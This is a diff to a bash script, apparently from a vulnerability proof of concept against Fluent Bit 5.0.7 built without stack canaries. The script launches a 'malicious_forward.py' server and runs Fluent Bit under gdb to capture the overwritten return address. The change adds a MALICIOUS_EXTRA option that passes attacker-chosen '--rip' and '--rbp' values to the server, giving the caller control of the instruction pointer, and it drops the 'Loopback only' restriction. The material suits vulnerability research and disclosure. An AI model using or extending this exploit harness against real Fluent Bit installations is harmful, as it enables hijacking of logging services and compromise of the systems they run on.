@@ -1,15 +1,23 @@
 #!/usr/bin/env bash
 # Observe the taken return address in a real no-canary Fluent Bit 5.0.7 flush.
-# Loopback only. Usage: gdb_nocanary.sh <port>
+# Usage: MALICIOUS_EXTRA='--rip 0x... --rbp 0' OUT_TAG=name gdb_nocanary.sh <port>
 set -u
 PORT=$1
+TAG=${OUT_TAG:-gdb-nocanary}
+EXTRA=()
+if [ -n "${MALICIOUS_EXTRA:-}" ]; then
+  read -r -a EXTRA <<< "$MALICIOUS_EXTRA"
+fi
+
 HERE=$(cd "$(dirname "$0")" && pwd)
 OUT="$HERE/evidence"
 mkdir -p "$OUT"
-CONF="$OUT/gdb-nocanary.conf"
+CONF="$OUT/$TAG.conf"
+
 sed "s/@PORT@/$PORT/" "$HERE/victim.conf.in" > "$CONF"
 
-python3 "$HERE/malicious_forward.py" --port "$PORT" > "$OUT/gdb-nocanary-server.log" 2>&1 &
+python3 "$HERE/malicious_forward.py" --port "$PORT" "${EXTRA[@]}" > "$OUT/$TAG-server.log" 2>&1 &
+
 SPID=$!
 sleep 0.7
 
@@ -25,12 +33,13 @@ gdb -q -batch "${FB_BIN:-./bin-v507-nocanary}" \
   -ex 'info registers rip rbp rsp' \
   -ex 'bt 4' \
   -ex 'printf "=== END ===\n"' \
-  > "$OUT/gdb-nocanary.out" 2>&1
+  > "$OUT/$TAG.out" 2>&1
+
 GRC=$?
 
 kill -TERM "$SPID" 2>/dev/null || true
 wait "$SPID" 2>/dev/null || true
 echo "GDB_RC=$GRC"
-cat "$OUT/gdb-nocanary.out"
+cat "$OUT/$TAG.out"
 echo "--- SERVER ---"
-cat "$OUT/gdb-nocanary-server.log"
+cat "$OUT/$TAG-server.log"
